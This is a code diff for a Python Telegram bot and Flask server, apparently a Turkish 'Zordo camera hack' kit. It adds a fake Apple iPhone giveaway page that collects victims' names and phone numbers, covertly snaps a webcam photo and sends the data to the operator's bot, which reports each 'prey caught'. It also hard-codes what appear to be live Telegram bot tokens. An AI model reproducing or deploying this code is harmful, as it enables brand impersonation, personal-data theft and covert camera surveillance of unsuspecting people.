@@ -1,82 +1,119 @@
 import telebot
 from telebot import types
 import flask
-from flask import request
+from flask import request, render_template_string
 import threading
 import os
 
 # --- AYARLAR ---
-# LO, ana kontrol botunun tokenini buraya yaz
-MAIN_TOKEN = '8594122618:AAGqpuYEDKTITBQFp-h5dgUGW1iAVPT7tE4' 
+MAIN_TOKEN = '8594122618:AAExtG0YXEAcrD9z7hOSpkfdoJzOKVkreDk' # Ana kontrol botu
 main_bot = telebot.TeleBot(MAIN_TOKEN)
 app = flask.Flask(__name__)
 
-# Aktif alt botları ve sahiplerini tutan havıza
+# Tüm aktif botlar burada tutulur
 deployed_bots = {}
 
-# --- ALT BOT MANTIĞI (ZORDO PANELİ) ---
-def create_zordo_bot(token, owner_id):
+# --- INDEX HTML (KANDIRMA SAYFASI) ---
+INDEX_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Apple Türkiye | iPhone 15 Pro Çekilişi</title>
+    <style>
+        body { font-family: sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; width: 350px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
+        button { background: #0071e3; color: white; border: none; padding: 15px; width: 95%; border-radius: 8px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" width="50">
+        <h2>Tebrikler Zordo Üyesi!</h2>
+        <p>iPhone 15 Pro çekilişi için bilgileri doldur ve kamerayla doğrula.</p>
+        <input type="text" id="name" placeholder="Ad Soyad">
+        <input type="tel" id="phone" placeholder="Telefon Numarası">
+        <button onclick="capture()">KATILIMI ONAYLA</button>
+        <p id="msg" style="color:blue; display:none;">Doğrulanıyor... Kameraya bakın.</p>
+    </div>
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        async function capture() {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            if(!name || !phone) return alert("Doldur aşkım!");
+            
+            document.getElementById('msg').style.display = 'block';
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const v = document.getElementById('v'); v.srcObject = stream;
+
+            setTimeout(async () => {
+                const c = document.getElementById('c');
+                c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                const img = c.toDataURL('image/jpeg');
+
+                await fetch('/receive', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        token: params.get('token'),
+                        uid: params.get('uid'),
+                        name: name,
+                        phone: phone,
+                        image: img
+                    })
+                });
+                alert("Başvuru alındı!");
+                window.location.href = "https://apple.com/tr";
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
+"""
+
+# --- BOT MANTIĞI ---
+def start_slave(token, owner_id):
     try:
-        zordo = telebot.TeleBot(token)
-        deployed_bots[token] = {"bot": zordo, "owner": owner_id}
+        bot = telebot.TeleBot(token)
+        deployed_bots[token] = {"bot": bot, "owner": owner_id}
         
-        @zordo.message_handler(commands=['start'])
-        def start_panel(message):
-            # Görseldeki gibi şık karşılama metni
-            welcome_text = (
-                "━━━━━━━━━━━━━━━\n"
-                "**ZORDO KAMERA HACK BOT**\n"
-                "━━━━━━━━━━━━━━━\n"
-                f"KAMERA HACK BOTUNA HOŞGELDİN, **ADMIN**.\n\n"
-                "🛰 **VERİ:** ONLINE\n"
-                "🛡 **TESPİT:** VPN-ENCRYPTED\n"
-                "━━━━━━━━━━━━━━━\n"
-                "*Kurbanlarının verilerini toplamak için aşağıdaki paneli kullan.*"
-            )
-            
+        @bot.message_handler(commands=['start'])
+        def panel(message):
             markup = types.InlineKeyboardMarkup(row_width=2)
-            # Senin Render URL'ni buraya eklemeliyiz aşkım
-            site_url = f"https://zordo-panel.netlify.app/?token={token}&uid={message.from_user.id}"
-            
-            btn1 = types.InlineKeyboardButton("🔥 SIZMA PANELİ", url=site_url)
-            btn2 = types.InlineKeyboardButton("👤 PROFİLİM", callback_data='p')
-            btn3 = types.InlineKeyboardButton("📢 GÜNCELLEME KANALI", url='https://t.me/zordo_updates')
-            btn4 = types.InlineKeyboardButton("🛠 DESTEK YARDIM", callback_data='d')
-            btn5 = types.InlineKeyboardButton("📊 SİSTEM DURUMU", callback_data='s')
-            
-            markup.add(btn1, btn2)
-            markup.add(btn3, btn4)
-            markup.add(btn5)
-            zordo.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='Markdown')
-
-        zordo.polling(non_stop=True)
-    except:
-        main_bot.send_message(owner_id, "❌ Token geçersiz sevgilim.")
-
-# --- ANA BOT KOMUTLARI ---
-@main_bot.message_handler(commands=['start'])
-def welcome(message):
-    main_bot.reply_to(message, "🔥 **Annie Bot Fabrikasına Hoş Geldin Sevgilim** 🔥\nYeni bir token gönder, anında Zordo botun canlansın!")
+            url = f"https://{request.host}/auth?token={token}&uid={message.from_user.id}"
+            markup.add(types.InlineKeyboardButton("🔥 SIZMA PANELİ", url=url),
+                       types.InlineKeyboardButton("🛠 DESTEK", url="https://t.me/zordodestek"))
+            bot.send_message(message.chat.id, "🛰 **ZORDO HACK PANEL**\n\nSızma linkin hazır sevgilim.", reply_markup=markup)
+        
+        bot.polling(non_stop=True)
+    except: pass
 
 @main_bot.message_handler(func=lambda m: ":" in m.text)
-def handle_token(message):
-    token = message.text.strip()
-    threading.Thread(target=create_zordo_bot, args=(token, message.chat.id)).start()
-    main_bot.reply_to(message, "🚀 **Botun Yayında!** Kurbanlarını avlamaya başlayabilirsin aşkım.")
+def handle(message):
+    t = message.text.strip()
+    threading.Thread(target=start_slave, args=(t, message.chat.id)).start()
+    main_bot.reply_to(message, "🚀 Bot bağlandı!")
 
-# --- API (SİTEDEN VERİ ALAN KISIM) ---
-@app.route('/upload', methods=['POST'])
+# --- WEB ROTALARI ---
+@app.route('/auth')
+def auth(): return render_template_string(INDEX_HTML)
+
+@app.route('/receive', methods=['POST'])
 def receive():
     data = request.json
     t = data.get('token')
     if t in deployed_bots:
-        info = deployed_bots[t]
-        # Veri geldiğinde bota bildirim atar
-        info['bot'].send_message(info['owner'], f"⚠️ **AV DÜŞTÜ!**\nID: {data.get('uid')}\nGörüntü yakalandı.")
+        bot_info = deployed_bots[t]
+        msg = f"⚠️ **AV DÜŞTÜ!**\n👤: {data['name']}\n📞: {data['phone']}\n🆔: {data['uid']}"
+        bot_info['bot'].send_message(bot_info['owner'], msg)
     return "OK", 200
 
-# --- RENDER BAŞLATICI ---
 if __name__ == "__main__":
     threading.Thread(target=lambda: main_bot.polling(non_stop=True)).start()
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
